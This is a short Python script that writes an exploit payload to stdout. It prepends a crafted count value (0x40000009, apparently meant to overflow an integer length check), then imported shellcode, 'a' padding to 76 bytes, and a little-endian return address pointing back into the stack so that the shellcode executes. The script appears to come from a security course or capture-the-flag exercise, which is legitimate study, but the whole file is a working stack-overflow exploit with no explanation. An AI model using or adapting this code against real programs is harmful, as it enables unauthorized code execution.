from shellcode import shellcode
import sys

count = 0x40000009
shellcode_addr = 0xfff6a05c - 76
# eip_addr = 0xfff6a05c
fill = 76 - len(shellcode)

user_input = b"a" * fill
user_input += shellcode_addr.to_bytes(4, "little")

final = count.to_bytes(4, "little") + shellcode + user_input
sys.stdout.buffer.write(final)